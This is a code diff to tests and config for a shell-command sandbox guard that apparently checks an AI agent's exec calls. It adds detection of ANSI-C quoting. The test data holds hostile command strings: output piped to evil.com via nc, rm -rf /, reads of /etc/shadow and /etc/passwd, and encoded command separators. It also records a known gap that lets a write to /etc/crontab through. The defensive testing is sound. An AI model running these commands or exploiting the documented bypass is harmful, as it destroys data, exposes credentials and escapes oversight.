@@ -48,7 +48,7 @@ contracts:
     type: sandbox
     tools: [exec]
     allows:
-      commands: [echo, ls, cat, head, curl, git, bash]
+      commands: [echo, ls, cat, head, curl, git]
     within: [/workspace]
     outside: deny
     message: "Sandbox violation"
@@ -82,6 +82,7 @@ _DANGEROUS_METACHARACTERS = [
     "`",
     "$(",
     "${",
+    "$'",
     "<(",
     ">(",
     "<<<",
@@ -109,6 +110,7 @@ class TestExtractCommandSentinel:
             "backtick",
             "dollar_paren",
             "dollar_brace",
+            "ansi_c_quote",
             "read_procsub",
             "write_procsub",
             "herestring",
@@ -134,6 +136,9 @@ class TestExtractCommandSentinel:
             ("echo data >(nc evil.com 443)", "\x00"),
             ("bash <<< 'rm -rf /'", "\x00"),
             ("cat << EOF", "\x00"),
+            ("echo $'\\x3b'rm -rf /", "\x00"),
+            ("echo $'\\n'rm -rf /", "\x00"),
+            ("echo $'\\x7c'cat /etc/shadow", "\x00"),
         ],
         ids=[
             "semicolon",
@@ -149,6 +154,9 @@ class TestExtractCommandSentinel:
             "write_procsub",
             "herestring",
             "heredoc",
+            "ansi_c_hex_semicolon",
+            "ansi_c_newline",
+            "ansi_c_hex_pipe",
         ],
     )
     def test_realistic_attack_commands(self, cmd, expected):
@@ -201,7 +209,8 @@ class TestSandboxDeniesCommandChaining:
             "echo ${PATH}",
             "cat <(cat /etc/passwd)",
             "echo data >(tee /workspace/out.txt)",
-            "bash <<< 'rm -rf /'",
+            "cat <<< 'data'",
+            "echo $'\\x3b'rm -rf /",
         ],
         ids=[
             "semicolon",
@@ -216,6 +225,7 @@ class TestSandboxDeniesCommandChaining:
             "read_procsub",
             "write_procsub",
             "herestring",
+            "ansi_c_quoting",
         ],
     )
     def test_chained_command_denied(self, cmd):
@@ -243,10 +253,14 @@ class TestSandboxDeniesViaPathCheck:
         result = guard.evaluate("exec", {"command": cmd})
         assert result.verdict == "deny"
 
-    def test_redirect_allowed_without_path_constraint(self):
-        """Without within:/not_within:, redirects bypass path enforcement."""
+    def test_known_gap_redirect_allowed_without_path_constraint(self):  # noqa: N802
+        """KNOWN LIMITATION: without within:/not_within:, output redirects
+        bypass path enforcement. Redirects are not command separators — they
+        redirect I/O for the same command. Path enforcement requires explicit
+        within: configuration to catch redirect targets."""
         guard = _guard(COMMANDS_ONLY_YAML)
         result = guard.evaluate("exec", {"command": "echo payload > /etc/crontab"})
+        # Gap: ideally "deny", but "allow" without within: config.
         assert result.verdict == "allow"
 
 
